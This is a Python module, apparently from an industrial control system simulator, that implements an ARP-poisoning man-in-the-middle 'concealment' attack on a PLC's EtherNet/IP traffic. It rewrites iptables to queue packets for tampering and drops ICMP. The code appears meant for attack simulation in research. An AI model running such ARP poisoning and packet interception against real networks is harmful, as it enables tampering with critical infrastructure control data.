import argparse
import os
from pathlib import Path

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from dhalsim.network_attacks.synced_attack import SyncedAttack

import subprocess
import sys
import signal


class Error(Exception):
    """Base class for exceptions in this module."""


class ConcealmentAttack(SyncedAttack):
    """
    todo

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')

        # Process object to handle nfqueue
        self.nfqueue_process = None

    def setup(self):
        """
        This function start the network attack.

        It first sets up the iptables on the attacker node to capture the tcp packets coming from
        the target PLC. It also drops the icmp packets, to avoid network packets skipping the
        attacker node.

        Afterwards it launches the ARP poison, which basically tells the network that the attacker
        is the PLC, and it tells the PLC that the attacker is the router.

        Finally, it launches the thread that will examine all captured packets.
        """

        os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
                  f'--queue-num 1')

        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        # Launch the ARP poison by sending the required ARP network packets
        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])

        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        queue_number = 1
        nfqueue_path = Path(__file__).parent.absolute() / "concealment_netfilter_queue.py"
        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]

        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)

    def interrupt(self):
        """
        This function will be called when we want to stop the attacker. It calls the teardown
        function if the attacker is in state 1 (running)
        """
        if self.state == 1:
            self.teardown()

    def teardown(self):
        """
        This function will undo the actions done by the setup function.

        It first restores the arp poison, to point to the original router and PLC again. Afterwards
        it will delete the iptable rules and stop the thread.
        """
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    restore_arp(self.target_plc_ip, plc['local_ip'])

        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
                  f'--queue-num 1')

        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        self.logger.debug(f"Restored ARP")

        self.logger.debug("Stopping nfqueue subprocess...")
        self.nfqueue_process.send_signal(signal.SIGINT)
        self.nfqueue_process.wait()
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.terminate()
        if self.nfqueue_process.poll() is None:
            self.nfqueue_process.kill()

    def attack_step(self):
        """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
        pass


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = ConcealmentAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
